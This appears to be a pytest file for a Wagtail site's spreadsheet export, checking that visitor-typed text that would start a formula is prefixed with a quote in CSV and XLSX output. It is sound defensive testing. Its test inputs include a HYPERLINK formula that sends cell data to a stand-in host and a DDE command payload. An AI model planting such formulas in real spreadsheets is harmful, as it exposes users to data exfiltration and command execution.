"""Spreadsheet exports show what visitors typed as text, and never run it as a formula."""

import io
from types import SimpleNamespace

import pytest
from openpyxl import load_workbook
from wagtail.admin.views.mixins import SpreadsheetExportMixin

from core.exports import VisitorTextExportMixin, as_text

FORMULA = '=HYPERLINK("https://example.org/?d="&B2,"Open")'


class Export(VisitorTextExportMixin, SpreadsheetExportMixin):
    list_export = ["name", "amount"]


ROWS = [SimpleNamespace(name=FORMULA, amount=2500)]


@pytest.mark.parametrize(
    "typed", [FORMULA, "+cmd|' /C calc'!A0", "-2+3", "@SUM(1)", "\t=1", "\r=1"]
)
def test_text_that_would_start_a_formula_starts_with_a_quote(typed):
    assert as_text(typed) == "'" + typed


@pytest.mark.parametrize("kept", ["Sita Sharma", "+9779841234567", "-25", "2,500", "", 2500, None])
def test_other_values_and_plain_numbers_are_kept(kept):
    assert as_text(kept) == kept


def test_a_csv_cell_is_text():
    csv = b"".join(Export().stream_csv(ROWS)).decode()

    assert f"'{FORMULA}".replace('"', '""') in csv


def test_an_xlsx_cell_is_text_with_nothing_added():
    output = io.BytesIO()
    Export().write_xlsx(ROWS, output)

    name, amount = next(load_workbook(output).active.iter_rows(min_row=2))
    assert (name.value, name.data_type) == (FORMULA, "s")
    assert (amount.value, amount.data_type) == (2500, "n")
